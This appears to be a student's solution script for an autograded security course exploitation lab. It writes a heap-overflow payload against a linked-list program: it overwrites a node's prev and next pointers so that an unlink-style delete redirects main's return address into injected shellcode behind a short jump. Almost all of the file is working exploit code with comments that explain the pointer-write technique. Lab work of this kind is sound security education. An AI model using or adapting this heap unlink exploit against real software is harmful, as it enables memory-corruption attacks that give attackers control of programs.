#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# You MUST fill in the values of the a, b, and c node pointers below. When you
# use heap addresses in your main solution, you MUST use these values or
# offsets from these values. If you do not correctly fill in these values and use
# them in your solution, the autograder may be unable to correctly grade your
# solution.

# IMPORTANT NOTE: When you pass your 3 inputs to your program, they are stored
# in memory inside of argv, but these addresses will be different then the
# addresses of these 3 nodes on the heap. Ensure you are using the heap
# addresses here, and not the addresses of the 3 arguments inside argv.

node_a = 0x080dd300
node_b = 0x080dd330
node_c = 0x080dd360

# Example usage of node address with offset -- Feel free to ignore
a_plus_4 = pack("<I", node_a + 4)

# Your code here
# a->data: anything
sys.stdout.buffer.write(b"abc")

# b->data: need to overwrite c->prev and c->next
sys.stdout.buffer.write(b" ")
sys.stdout.buffer.write(b"a" * 40)  # fill b->data, extra 8 bytes for 16 bytes aligned
sys.stdout.buffer.write(pack("<I", node_c + 8))  # c->prev = &c->data = 8 bytes before sh code
sys.stdout.buffer.write(pack("<I", 0xfffeb318))  # c->next = &ret_main

# c->data
sys.stdout.buffer.write(b" ")
sys.stdout.buffer.write(pack("<I", 0x909006eb))  # jmp 6 bytes, "eb" for jmp
sys.stdout.buffer.write(pack("<I", 0x90909090))
sys.stdout.buffer.write(shellcode)

# c->prev = c->data
# c->next = &ret_main
# delete(c):

# c->prev->next = c->next
#   --> c->data[4] = &ret_main
# c->next->prev = c->prev
#   --> *(&ret_main + 0) = c->data
#   --> ret_main = c->data (jmp 6 bytes)
